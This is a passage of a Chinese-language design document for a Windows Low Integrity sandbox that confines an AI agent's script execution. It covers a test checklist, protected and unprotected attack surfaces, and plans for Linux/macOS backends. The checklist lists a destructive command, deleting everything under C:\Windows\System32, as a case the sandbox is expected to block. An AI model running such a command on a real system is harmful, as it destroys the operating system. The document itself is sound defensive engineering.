    // DATABASE_URL 不在白名单中
    expect(result.stdout).toContain('NOT_SET');
  });
});
```

### 9.2 验证清单

| 测试场景 | 预期结果 |
|---------|---------|
| 正常执行 Python 脚本 | 正常输出，exitCode = 0 |
| 在工作区内写文件 | 成功 |
| 写入 `C:\Windows\` | ACCESS_DENIED / PermissionError |
| 写入 `%USERPROFILE%\` | ACCESS_DENIED / PermissionError |
| 写入 `C:\Program Files\` | ACCESS_DENIED / PermissionError |
| 执行 `del C:\Windows\System32\*` | 失败 |
| 执行 JSON 格式的数据读取 | 正常 |
| 超时脚本 | 子进程被 kill，timedOut = true |
| 超大输出 | 被截断，truncated = true |
| 环境变量泄漏（API Key） | 子进程不可见 |
| 启动时 launcher.exe 缺失 | 抛出明确错误信息 |

---

## 10. 安全边界与局限性

### 10.1 防护面

| 防护项 | 状态 |
|--------|:----:|
| 写入系统目录（`C:\Windows`, `C:\Program Files`） | ✅ 阻断 |
| 写入用户 Profile 目录 | ✅ 阻断 |
| 写入注册表 `HKCU` | ✅ 阻断 |
| 写入注册表 `HKLM` | ✅ 阻断 |
| 删除工作区外文件 | ✅ 阻断 |
| 修改系统时间 | ✅ 阻断（需剥离特权，可考虑在后续版本中加入） |
| 创建/启动系统服务 | ✅ 阻断（Low IL 无权） |
| 环境变量泄漏 API Key | ✅ 阻断（白名单脱敏） |
| 资源耗尽（CPU 无限循环） | ✅ 阻断（超时 kill） |
| 输出炸弹（无限写 stdout） | ✅ 阻断（输出截断） |

### 10.2 未防护面（已知局限）

| 未防护项 | 原因 | 缓解措施 |
|---------|------|---------|
| 读取工作区外文件 | Low IL 天然可读 Medium IL 对象 | 路径监狱（Path Jail）限制文件操作 API；后续可加 ACL 显式拒绝 |
| 网络数据外传 | Low IL 不限制网络访问 | 后续可选：hosts 文件阻断、Windows Filtering Platform 规则 |
| 进程内 DoS（while true 无 I/O） | CPU 限制需要 Job Object | 后续版本可选集成 Job Object 内存限制 |
| Low IL 绕过（Token 窃取/复制） | 操作系统级漏洞 | 超出本方案范围，属于 OS 补丁范畴 |
| DLL 注入/劫持 | Low IL 进程可加载同目录 DLL | 确保工作区目录无恶意 DLL |

### 10.3 不是安全银弹

本方案的核心防护面是**阻止 AI Agent 意外或恶意破坏系统文件的写入操作**。它不能：

- 阻止 Agent 读取敏感文件然后用网络外传（需要网络隔离或文件访问审计）
- 阻止 Agent 在工作区内做任何它想做的事（这是设计意图——工作区就是给 Agent 用的）
- 替代完整的容器沙盒（如 Docker/Windows Sandbox），后者提供完整的网络和文件系统隔离

对于个人电脑上的 AI 编程辅助工具，Low IL 隔离在"最小可行安全"和"实现复杂度"之间取得了最佳平衡。

---

## 11. Linux/macOS 适配预留

当前 `ISandboxBackend` 接口已设计为可插拔。Linux/macOS 的后端可以在不修改任何上游调用代码的情况下接入：

```
src/common/services/sandbox/backends/
├── windows-low-integrity.backend.ts    ← 当前实现
├── linux-bubblewrap.backend.ts         ← 预留：bwrap --ro-bind
└── macos-sandbox-exec.backend.ts       ← 预留：sandbox-exec
```

各平台的核心隔离机制：

| 平台 | 机制 | 命令示例 |
|------|------|---------|
| Linux | bubblewrap (bwrap) | `bwrap --ro-bind / / --bind workspace workspace python script.py` |
| macOS | sandbox-exec | `sandbox-exec -f profile.sb python script.py` |

---

## 12. 附录：关键代码参考

### 12.1 现有代码中需要关注的关键位置

| 说明 | 文件 | 行号范围 |
|------|------|---------|
| Shell 命令执行核心 | [shell-tool.provider.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\tools\providers\shell-tool.provider.ts) | L232-L237 |
| 脚本执行 spawn | [skill-script-executor.service.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\skills\execution\skill-script-executor.service.ts) | L54-L60 |
| 工作区路径解析 | [workspace.service.ts](file:///d:\AI\ai_chat\backend-ts\src\common\services\workspace.service.ts) | L28-L40 |
| ToolOrchestrator 调度入口 | [tool-orchestrator.service.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\tools\tool-orchestrator.service.ts) | L139-L196 |
| SharedModule 注册 | [shared.module.ts](file:///d:\AI\ai_chat\backend-ts\src\common\services\shared.module.ts) | L1-L18 |
| SkillsModule 注册 | [skills.module.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\skills\skills.module.ts) | L1-L36 |
| Electron 主进程 | [main.ts](file:///d:\AI\ai_chat\electron\main.ts) | L1-L60 |
| Electron 打包配置 | [package.json](file:///d:\AI\ai_chat\package.json) | L50-L95 |

### 12.2 术语表

| 术语 | 全称 | 说明 |
|------|------|------|
| IL | Integrity Level | Windows 强制完整性级别 |
| MIC | Mandatory Integrity Control | Windows 强制完整性控制机制 |
| Low IL | Low Integrity Level | 最低的受限进程级别（S-1-16-4096） |
| Medium IL | Medium Integrity Level | 标准用户进程级别（S-1-16-8192） |
| Job Object | Windows Job Object | Windows 进程组管理对象，支持资源限制 |
| Path Jail | — | 路径监狱，限制文件操作在指定目录树内 |
| bwrap | bubblewrap | Linux 用户命名空间沙盒工具 |

### 12.3 参考资源

- [Windows Integrity Mechanism Design (Microsoft Docs)](https://docs.microsoft.com/en-us/windows/win32/secauthz/windows-integrity-mechanism-design)
- [CreateProcessAsUserW (Win32 API)](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)
- [SetTokenInformation (Win32 API)](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-settokeninformation)
- [Bubblewrap GitHub](https://github.com/containers/bubblewrap)
- [Apple Sandbox Guide](https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf)
